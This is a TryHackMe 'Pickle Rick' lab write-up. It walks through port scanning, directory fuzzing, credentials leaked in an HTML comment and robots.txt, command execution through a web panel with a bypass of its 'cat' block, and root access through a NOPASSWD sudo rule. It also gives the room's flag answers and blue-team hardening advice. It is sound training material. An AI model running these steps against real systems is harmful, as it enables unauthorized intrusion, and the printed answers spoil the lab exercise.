c---
layout: pickle-rick
title: Pickle Rick Writeup
---

# [Pickle Rick](https://tryhackme.com/room/picklerick)

<div class="info-card">

[INFO CARD]
Platform   : TryHackMe
Difficulty : Easy
Category   : Web Exploitation | Linux PrivEsc
Tags       : Command Injection | Web Shell | Sudo Misconfiguration

</div>
---

## Overview

Rick has turned himself into a pickle. Again. To undo the damage he needs three secret ingredients, but he has also managed to forget the password to his own computer. Morty is unavailable, so that leaves us. The goal is to exploit a web server, gain command execution, and recover all three ingredients before Rick spends the rest of his life as a condiment.

From a blue team perspective this room covers the complete kill chain of a web application compromise: credential exposure through source code and robots.txt, unauthenticated command injection via a web shell panel, and a catastrophically misconfigured sudo policy that hands over root with zero resistance.

---

## Enumeration

### Port Scan

```
nmap -sC -sV <TARGET_IP>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
```

Two ports. SSH on 22 with no credentials yet, HTTP on 80 as the obvious entry point.

```
Attack surface
┌──────────────────────────────────────┐
│  Internet                            │
│         ┌──────────┐                 │
│         │  Port 80 │◄── Start here   │
│         │  Apache  │                 │
│         └──────────┘                 │
│         ┌──────────┐                 │
│         │  Port 22 │◄── Later        │
│         │  SSH     │                 │
│         └──────────┘                 │
└──────────────────────────────────────┘
```

### Web Reconnaissance

Navigating to `http://<TARGET_IP>/` shows a Rick and Morty-themed landing page asking us to help Rick find his ingredients. Rick left a note for Morty. He also left something else.

**View Page Source:**

Buried in an HTML comment:

```html
<!--
    Note to self, remember username!
    Username: R1ckRul3s
-->
```

Username collected. Now we need a password.

**robots.txt:**

```
http://<TARGET_IP>/robots.txt
```

```
Wubbalubbadubdub
```

Rick put his password in robots.txt. This is indexed by search engines by design. Rick is a genius, apparently.

### Directory Fuzzing

```bash
gobuster dir -u http://<TARGET_IP>/ -x php,html,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Key findings:

```
/login.php    (Status: 200)
/portal.php   (Status: 302)
/robots.txt   (Status: 200)
```

`login.php` is our target. `portal.php` redirects to the login page until authenticated.

---

## Initial Access

### Login

Navigate to `http://<TARGET_IP>/login.php` and log in with:

```
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

After authenticating, `portal.php` presents a **Command Panel**. This is not a metaphor. It is a literal command execution box on a publicly accessible web application running as `www-data`.

```
Credential exposure chain
┌──────────────────────────────────────────┐
│  HTML comment  ──►  Username: R1ckRul3s  │
│  robots.txt    ──►  Password: Wubba...   │
│                                          │
│  Combined  ──►  login.php authenticated  │
│           ──►  portal.php command panel  │
└──────────────────────────────────────────┘
```

### Command Injection via Web Shell

Running `whoami` in the panel confirms we are executing as `www-data`.

```bash
whoami
# www-data
```

```bash
ls
# Sup3rS3cretPickl3Ingred.txt
# assets
# clue.txt
# denied.php
# index.html
# login.php
# portal.php
# robots.txt
```

There is our first ingredient file sitting in the web root. `cat` is blocked by the application, but `less` and `tac` are not.

```bash
less Sup3rS3cretPickl3Ingred.txt
```

> **Ingredient 1:** `mr. meeseek hair`

`clue.txt` tells us to look around the file system for the remaining ingredients, which is polite of Rick.

---

## Post-Exploitation

### Ingredient 2 - /home/rick

```bash
ls /home
# rick
# ubuntu

ls /home/rick
# second ingredients
```

The file name contains a space, so it needs quoting or escaping:

```bash
less "/home/rick/second ingredients"
```

> **Ingredient 2:** `1 jerry tear`

### Ingredient 3 - Root

```bash
sudo -l
```

```
User www-data may run the following commands on ip-10-10-x-x:
    (ALL) NOPASSWD: ALL
```

The web server user can run every command as root without a password. This is the kind of sudo configuration that makes a penetration tester's eyes light up and a defender's soul leave their body.

```bash
sudo ls /root
# 3rd.txt

sudo less /root/3rd.txt
```

> **Ingredient 3:** `fleeb juice`

---

## Attack Path Summary

```
[Recon]
  │
  ├─ HTML comment ──► username R1ckRul3s
  └─ robots.txt   ──► password Wubbalubbadubdub
         │
[Initial Access]
  │
  └─ login.php ──► portal.php command panel (www-data RCE)
         │
[Lateral Discovery]
  │
  ├─ /var/www/html/Sup3rS3cretPickl3Ingred.txt ──► Ingredient 1
  └─ /home/rick/second ingredients              ──► Ingredient 2
         │
[Privilege Escalation]
  │
  └─ sudo -l ──► (ALL) NOPASSWD: ALL ──► sudo less /root/3rd.txt
                                         ──► Ingredient 3
```

---

## Flags

| # | Question                            | Answer          |
|---|-------------------------------------|-----------------|
| 1 | What is the first ingredient Rick needs? | `mr. meeseek hair` |
| 2 | What is the second ingredient Rick needs? | `1 jerry tear`  |
| 3 | What is the last and final ingredient?    | `fleeb juice`   |

---

## Blue Team Takeaways

**Credential Exposure in Source Code and robots.txt**
Credentials hardcoded in HTML comments or placed in files intended for search engine crawlers are trivially enumerable. Source code review and automated secret scanning (truffleHog, git-secrets) catch this before deployment. robots.txt is public by design. Never put anything sensitive there.

**Command Injection via Web Shell Panels**
The portal command panel represents a completely unfiltered execution interface exposed to authenticated users. Allowlisting specific commands rather than blocklisting dangerous ones is the correct pattern. The application's blocklist approach (blocking `cat` while leaving `less`, `tac`, `awk`, and `base64` available) is trivially bypassed. Defense in depth would include WAF rules, strict input validation, and running the web application under a dedicated service account with no shell access.

**Sudo Misconfiguration**
`(ALL) NOPASSWD: ALL` for `www-data` is a catastrophic misconfiguration. Principle of least privilege means a web server process should have no sudo rights at all. If escalated permissions are required for specific operations, they should be scoped to exactly those binaries. Tools like `sudo -l` during incident response immediately reveal this type of overprivilege and should be part of any Linux hardening audit.

---

*Wubbalubbadubdub.*
